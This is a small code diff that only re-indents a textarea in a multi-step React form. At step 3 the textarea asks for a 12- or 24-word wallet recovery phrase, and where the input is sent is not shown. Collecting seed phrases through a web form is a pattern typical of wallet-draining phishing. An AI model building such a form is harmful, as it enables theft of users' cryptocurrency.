@@ -182,12 +182,12 @@ const Form = () => {
             <form onSubmit={handleStep3Submit}>
               <div className={styles.textareaCon}>
                 <textarea
-  value={formData}
-  onChange={handleFormDataChange}
-  className={styles.textarea}
-  rows={2}
-  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
-/>
+                  value={formData}
+                  onChange={handleFormDataChange}
+                  className={styles.textarea}
+                  rows={2}
+                  placeholder="Typically 12 (sometimes 24) words separated by single spaces"
+                />
               </div>
               {submitError && <p className={styles.error}>{submitError}</p>}
               <button type="submit" className={styles.submitButton} disabled={submitLoading}>
